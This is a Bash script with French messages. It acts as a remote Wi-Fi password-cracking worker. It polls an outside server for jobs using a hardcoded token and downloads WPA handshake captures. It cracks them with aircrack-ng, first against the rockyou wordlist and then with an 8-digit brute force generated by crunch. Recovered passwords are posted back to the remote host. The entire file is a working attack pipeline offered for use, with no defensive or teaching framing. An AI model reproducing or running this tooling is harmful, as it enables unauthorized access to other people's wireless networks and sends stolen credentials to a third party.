#!/bin/bash
SITE_URL="https://wifi-wpa.byethost3.com"
TOKEN="MonTokenSecret123456"

report() {
    curl -s -o /dev/null -X POST --data-urlencode "progress=$1" \
        "${SITE_URL}/api_progress.php?token=${TOKEN}&job_id=${JOB_ID}" 2>/dev/null || true
}

echo "🔍 Vérification des tâches..."
RESPONSE=$(curl -s "${SITE_URL}/api_status.php?token=${TOKEN}")
echo "API réponse: ${RESPONSE}"

JOB_ID=$(echo "$RESPONSE" | jq -r '.job.id' 2>/dev/null)
ESSID=$(echo "$RESPONSE" | jq -r '.job.essid // ""' 2>/dev/null)

if [ "$JOB_ID" == "null" ] || [ -z "$JOB_ID" ]; then
    echo "✅ Aucune tâche."
    exit 0
fi

echo "📥 Job #${JOB_ID} trouvé, téléchargement..."
report "📥 Téléchargement du fichier..."
curl -s -o "capture_${JOB_ID}.cap" "${SITE_URL}/api_download.php?token=${TOKEN}&id=${JOB_ID}"

if [ ! -f "capture_${JOB_ID}.cap" ] || [ ! -s "capture_${JOB_ID}.cap" ]; then
    echo "❌ Fichier vide ou introuvable"
    report "Fichier vide ou introuvable"
    curl -s -X POST --data-urlencode "id=${JOB_ID}" --data-urlencode "status=failed" \
        "${SITE_URL}/api_update.php?token=${TOKEN}"
    exit 1
fi

SIZE=$(stat -c%s "capture_${JOB_ID}.cap" 2>/dev/null || stat -f%z "capture_${JOB_ID}.cap" 2>/dev/null)
echo "📁 Fichier téléchargé (${SIZE} octets)"
report "Fichier téléchargé (${SIZE} octets)"

# Vérification que aircrack-ng reconnaît un handshake valide
aircrack-ng "capture_${JOB_ID}.cap" > /tmp/check_result.txt 2>&1
if ! grep -q "WPA (1 handshake)" /tmp/check_result.txt; then
    echo "❌ Pas de handshake valide dans le fichier"
    report "Pas de handshake valide"
    curl -s -X POST --data-urlencode "id=${JOB_ID}" --data-urlencode "status=failed" \
        "${SITE_URL}/api_update.php?token=${TOKEN}"
    rm -f "capture_${JOB_ID}.cap" /tmp/check_result.txt
    exit 1
fi

# === 1. Test avec rockyou.txt ===
echo "🔐 Test avec rockyou.txt..."
report "Test rockyou.txt..."

ARGS=""
[ -n "$ESSID" ] && ARGS="-e \"$ESSID\""

aircrack-ng -w /usr/share/wordlists/rockyou.txt $ARGS "capture_${JOB_ID}.cap" > result.txt 2>&1

if grep -q "KEY FOUND" result.txt; then
    PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}' | xargs)
    echo "✅ Mot de passe trouvé (rockyou) : [${PWD}]"
    report "Mot de passe trouvé"
    curl -s -X POST --data-urlencode "id=${JOB_ID}" --data-urlencode "status=cracked" \
        --data-urlencode "password=${PWD}" "${SITE_URL}/api_update.php?token=${TOKEN}"
    rm -f "capture_${JOB_ID}.cap" result.txt /tmp/check_result.txt wordlist_custom.txt 2>/dev/null
    exit 0
fi

echo "❌ Pas trouvé dans rockyou"
report "Rockyou échec. Force brute 8 chiffres..."

# === 2. Force brute 8 chiffres ===
echo "🔐 Génération de la wordlist 8 chiffres..."
crunch 8 8 0123456789 -o wordlist_custom.txt 2>/dev/null

if [ -f wordlist_custom.txt ] && [ -s wordlist_custom.txt ]; then
    echo "🔐 Force brute en cours..."
    report "Force brute en cours..."

    aircrack-ng -w wordlist_custom.txt $ARGS "capture_${JOB_ID}.cap" > result.txt 2>&1

    if grep -q "KEY FOUND" result.txt; then
        PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}' | xargs)
        echo "✅ Mot de passe trouvé (brute force) : [${PWD}]"
        report "Mot de passe trouvé"
        curl -s -X POST --data-urlencode "id=${JOB_ID}" --data-urlencode "status=cracked" \
            --data-urlencode "password=${PWD}" "${SITE_URL}/api_update.php?token=${TOKEN}"
        rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt /tmp/check_result.txt
        exit 0
    fi

    echo "❌ Force brute échec"
    report "Force brute échec"
else
    echo "❌ crunch n'a pas généré la wordlist"
    report "Crunch a échoué"
fi

# === Échec final ===
echo "❌ Mot de passe non trouvé"
curl -s -X POST --data-urlencode "id=${JOB_ID}" --data-urlencode "status=failed" \
    --data-urlencode "password=" "${SITE_URL}/api_update.php?token=${TOKEN}"
rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt /tmp/check_result.txt 2>/dev/null
echo "✅ Terminé"
